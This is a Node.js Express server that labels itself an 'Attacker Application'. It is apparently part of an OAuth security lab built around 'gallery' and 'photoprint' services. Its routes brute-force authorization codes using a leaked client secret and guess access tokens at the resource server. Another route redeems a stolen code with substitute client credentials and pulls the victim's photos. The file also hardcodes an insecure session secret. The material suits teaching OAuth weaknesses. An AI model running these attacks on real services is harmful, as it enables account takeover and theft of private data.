const express = require('express');
const expressSession = require('express-session');
const cookieParser = require('cookie-parser');
const bodyParser = require('body-parser');
const path = require('path');
const request = require('request');
const gallery = require('./config/gallery.json');
const photoprint = require('./config/photoprint.json');


let app = express();

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({extended: false}));
app.use(cookieParser());
app.use(expressSession({
  secret: 'changethistoconfigfile', //insecure
  resave: false,
  saveUninitialized: false
}));

//view engine
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

//serve content from public directory
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', function(req, res){
  res.render('index', {});
});

app.get('/callback', function(req, res){
  var code = req.query.code;
  res.render('authcode', {code: code});
});

function makeRequest(options) {
  return new Promise(function(resolve, reject){
    //using a leaked secret
    request(options, function(err, response, body){
      if(err) reject(err);
      if (response.statusCode != 200) {
        reject('Invalid status code <' + response.statusCode + '>');
      }
      resolve(body);
    });
  });
}


app.get('/guessauthzcode', async function(req, res){
  searchSpace = 10000;
  maxGuesses = 100;
  codes = [];
  for(i = 0; i < maxGuesses; i++) {
    randomguess = Math.floor(Math.random()*Math.floor(searchSpace));
    options = {
      'method':'post',
      'headers':{
        'content-type': 'application/x-www-form-urlencoded'
      },
      'url':gallery.oauth.auth.tokenHost + gallery.oauth.auth.tokenPath, 
      'body':'code='+randomguess+'&redirect_uri=' + photoprint.oauth.client.redirect_uri + '&grant_type=authorization_code&client_id=' + photoprint.oauth.client.id + '&client_secret=' + photoprint.oauth.client.secret
    };
    try {
      response = await makeRequest(options);
      var obj = JSON.parse(response);
      if(obj.access_token != undefined){
        codes.push({'code':randomguess,'token':obj.access_token});
      }

    }catch (error) {
      console.error(error);
    }
  }
  res.render('authcodeguess', {codes: codes});
});

app.get('/guessaccesstokenatresourceserver', async function(req, res){
  searchSpace = 100000;
  maxGuesses = 100;
  tokens = [];
  for(i = 0; i < maxGuesses; i++) {
    randomguess = Math.floor(Math.random()*Math.floor(searchSpace));
    
    try {
      response = await getPictureUrls2(randomguess);
      var obj = JSON.parse(response);
      if(obj.images != undefined){
        tokens.push(randomguess);
      }

    }catch (error) {
      console.error(error);
    }
  }
  console.log(tokens);
  res.render('tokenguess', {tokens: tokens});
});

async function getPictureUrls2(access_token) {
  if(access_token == undefined) {
    return [];
  }
  options2 = {
    'proxy':'http://localhost:8080',
    'method':'get',
    'headers':{
      "Accept": "application/json"
    },
    'url':gallery.oauth.auth.tokenHost + gallery.photos + '?access_token=' + access_token
    //'url':'http://gallery:3005/photos/me?access_token=' + access_token
  };
  return await makeRequest(options2);
}

async function getPictureUrls(access_token) {
  response = await getPictureUrls2(access_token);
  images = JSON.parse(response).images;
  return images;
}

app.post('/exchangewithothercreds', async function(req, res){
  var code = req.body.code;
  var clientid = req.body.clientid;
  var secret = req.body.secret;
  var access_token;
  options = {
    'method':'post',
    'headers':{
      'content-type': 'application/x-www-form-urlencoded'
    },
    'url':gallery.oauth.auth.tokenHost + gallery.oauth.auth.tokenPath, 
    'body':'code='+code+'&redirect_uri=http%3A%2F%2Fphotoprint%3A3000%2Fcallback&grant_type=authorization_code&client_id=' + clientid + '&client_secret=' + secret
  };
  try {
    response = await makeRequest(options);
    var obj = JSON.parse(response);
    images = await getPictureUrls(obj.access_token);
    console.log(images);
    res.render('exchangewithothercreds', {code: code, clientid: clientid, basepath:'http://gallery:3005/photos/me/', secret:secret, access_token:obj.access_token, images:images});

  }catch (error) {
    console.error(error);
    res.status(500).render(error);
  }
});

app.listen(1337, function () {
  console.log('Attacker Application listening on '+this.address().address +':'+this.address().port);
});
